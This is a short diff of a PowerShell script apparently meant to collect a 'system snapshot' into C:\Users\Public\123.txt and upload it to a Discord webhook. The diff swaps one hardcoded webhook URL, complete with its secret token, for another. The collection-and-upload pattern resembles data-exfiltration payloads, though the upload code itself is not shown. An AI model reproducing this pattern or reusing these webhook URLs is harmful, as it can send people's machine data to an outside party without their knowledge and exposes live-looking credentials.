@@ -1,7 +1,7 @@
 # === system-snapshot-and-upload.ps1 ===
 param(
     [string]$OutFile    = 'C:\Users\Public\123.txt',
-    [string]$WebhookUrl = 'https://discord.com/api/webhooks/1198720468656607305/dM6aLmCMHIy-UQGkbeyzL4LZGY-N6G_2Q4X-R44YBT3D2KxohEAxvq38GBbQ3T14t7HE'
+    [string]$WebhookUrl = 'https://discord.com/api/webhooks/1149298491659649034/WVWYNnSLYq1LoFVeDtwGRu4wQ0OJdbuxncSBU003oiUSGMWE0TuZMcH6R8Tsg9bzlcOy'
 )
 
 "=== System snapshot: $(Get-Date -Format 'yyyy-MM-ddTHH:mm:ssK') ===" | Out-File -FilePath $OutFile -Encoding utf8
